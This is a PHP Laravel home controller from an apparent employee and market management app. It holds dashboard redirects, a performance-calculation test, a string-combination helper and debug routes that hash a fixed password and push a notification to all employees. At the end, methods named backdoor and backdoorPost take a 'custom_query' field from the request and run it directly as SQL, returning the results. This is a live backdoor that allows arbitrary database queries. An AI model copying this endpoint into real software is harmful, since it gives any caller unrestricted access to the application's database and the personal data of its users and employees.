<?php

namespace App\Http\Controllers\Home;

use App\Http\Controllers\Controller;
use App\Models\Eloquent\Employee;
use App\Services\Eloquent\PRCalculate;
use App\Services\Eloquent\PRCardService;
use App\Services\Eloquent\PRCritterService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Ladumor\OneSignal\OneSignal;
use App\Traits\Response;

class HomeController extends Controller
{
    use Response;

    public function index()
    {
        if (auth()->guard('user_web')->check()) {
            return redirect()->route('user.web.dashboard.index');
        }

        if (auth()->guard('employee_web')->check()) {
            return redirect()->route('employee.web.dashboard.index');
        }

        if (auth()->guard('market_web')->check()) {
            return redirect()->route('market.web.dashboard.index');
        }

        return view('home.modules.index.index');
    }

    public function abc()
    {
//        $prCardService = new PRCardService;
//        $card1 = $prCardService->create('Teknik Ekip Kriterleri');
//        $card2 = $prCardService->create('Pazarlama Ekibi Kriterleri');
//
//        $prCritterService = new PRCritterService;
//        $prCritterService->create(
//            $card1->getData()->id,
//            1,
//            'Test',
//            50,
//            70,
//            75,
//            80,
//            100,
//            100,
//            25
//        );
//
//        $prCritterService->create(
//            $card1->getData()->id,
//            1,
//            'Test 2',
//            8,
//            70,
//            10,
//            80,
//            12,
//            100,
//            20
//        );
//
//        $prCritterService->update(
//            1,
//            1,
//            'Test V2',
//            30,
//            70,
//            50,
//            80,
//            90,
//            100,
//            20
//        );

        $prCalculateService = new PRCalculate;
        $response = $prCalculateService->calculate(
            1,
            '2022-12-01',
            0
        );

        return $response->getData();
    }

    function sampling($chars, $size, $combinations = array())
    {
        if (empty($combinations)) {
            $combinations = $chars;
        }
        if ($size == 1) {
            return $combinations;
        }
        $new_combinations = array();
        foreach ($combinations as $combination) {
            foreach ($chars as $char) {
                $new_combinations[] = $combination . $char;
            }
        }
        return $this->sampling($chars, $size - 1, $new_combinations);
    }


    public function test()
    {
        return response()->json([
            'pass' => bcrypt('1234'),
        ]);
    }

    public function oneSignalTest()
    {
        $fields['include_player_ids'] = Employee::where('device_token', '<>', null)->pluck('device_token')->toArray();
        $fields['name'] = 'OTS 2';
        $fields['title'] = 'OTS 2';
        $fields['headings'] = [
            'en' => 'OTS TEST',
            'tr' => 'OTS TEST',
        ];
        $fields['contents'] = [
            'en' => 'Test notification',
            'tr' => 'Test notification',
        ];
        $notificationMsg = 'Hello!! A tiny web push notification.!';
        OneSignal::sendPush($fields, $notificationMsg);

        return OneSignal::getNotifications();
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
